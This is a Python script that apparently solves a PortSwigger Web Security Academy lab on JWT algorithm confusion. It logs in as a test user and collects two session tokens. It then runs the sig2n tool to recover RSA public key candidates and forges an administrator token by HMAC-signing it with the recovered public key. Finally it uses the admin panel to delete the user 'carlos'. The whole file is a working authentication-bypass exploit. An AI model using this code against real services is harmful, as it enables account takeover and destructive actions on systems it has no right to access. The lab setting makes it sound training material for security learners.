import requests, base64, json, hmac, subprocess, jwt as pyjwt, hashlib, re
from jwcrypto import jwk
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

site = '0a9f00fc04c831758102e8270032004f.web-security-academy.net'
login_url = f'https://{site}/login'
admin_url = f'https://{site}/admin'
acct_url = f'https://{site}/my-account'

# get two jwt tokens to use for the attack
tokens = []
print("Getting JWT tokens...")
for i in range(2):
    s = requests.Session()
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    logindata = {
        'csrf' : csrf,
        'username' : 'wiener',
        'password' : 'peter'
    }
    resp = s.post(login_url, data = logindata) # log in to get jwt with csrf token
    tokens.append(s.cookies.get("session")) # jwt is in the session cookie, we can use it to access the admin page

print(f'2 JWT tokens obtained: {tokens}')

# run tool to crack secret from two jwts
print("Cracking JWT secret...")
result = subprocess.run(
    ["sudo", "docker", "run", "--rm", "-it", "portswigger/sig2n", tokens[0], tokens[1]],
    capture_output=True,
    text=True,
)

# sig2n output parsed to get the public key
def parse_sig2n_output(output):
    candidates = []
    
    # Split by multiplier blocks
    blocks = re.split(r'Found n with multiplier \d+:', output)
    
    for block in blocks:
        if not block.strip():
            continue
            
        # Extract tampered JWTs
        jwts = re.findall(r'Tampered JWT:\s+(\S+)', block)
        # Extract keys
        x509 = re.findall(r'Base64 encoded x509 key:\s+(\S+)', block)
        pkcs1 = re.findall(r'Base64 encoded pkcs1 key:\s+(\S+)', block)
        
        candidates.append({
            "jwts": jwts,
            "x509": x509[0] if x509 else None,
            "pkcs1": pkcs1[0] if pkcs1 else None
        })
    
    return candidates


def test_jwt(url, token):
    response = requests.get(
        url,
        cookies={"session": token},
        allow_redirects=False
    )
    return response.status_code, response.text

sig2n_output = result.stdout
success_candidate = None
candidates = parse_sig2n_output(sig2n_output)

for i, candidate in enumerate(candidates):
    print(f"\n[*] Testing multiplier candidate {i+1}")
    for jwt in candidate["jwts"]:
        status, body = test_jwt(acct_url, jwt)
        print(f"  JWT: {jwt[:50]}...")
        print(f"  Status: {status}")
        if status == 200:
            success_candidate = candidate
            print(f"  [+] VALID JWT FOUND: {jwt}")
            break
    if success_candidate:
        break

# create new jwt with administrator sub signed using the public key found with sig2n
def decode_b64(part):
    padding = 4 - len(part) % 4
    return json.loads(base64.urlsafe_b64decode(part + "=" * padding))
def b64_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

if success_candidate:
    print("\n[+] Valid JWT found! Crafting admin JWT...")
    
    public_key_bytes = base64.b64decode(success_candidate["x509"])
    
    # Take original token and decode its parts
    original_token = success_candidate["jwts"][0]
    header_b64, payload_b64, _ = original_token.split(".")
    
    header  = decode_b64(header_b64)
    payload = decode_b64(payload_b64)
    
    # Only change sub
    payload["sub"] = "administrator"
    
    # Re-encode and resign
    encoded_header  = b64_encode(json.dumps(header, separators=(",", ":")))
    encoded_payload = b64_encode(json.dumps(payload, separators=(",", ":")))
    
    signing_input = f"{encoded_header}.{encoded_payload}"
    
    signature = hmac.new(
        public_key_bytes,
        signing_input.encode(),
        hashlib.sha256
    ).digest()
    
    forged_token = f"{signing_input}.{b64_encode(signature)}"
    print(f"[+] Forged admin JWT: {forged_token}")

# log in to admin page
resp = s.get(admin_url, headers = {'Cookie' : f'session={forged_token}'}) # access admin page with edited jwt

# find carlos delete link and delete carlos
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']

s.get(f'https://{site}{delete_uri}', headers = {'Cookie' : f'session={forged_token}'}) # delete carlos
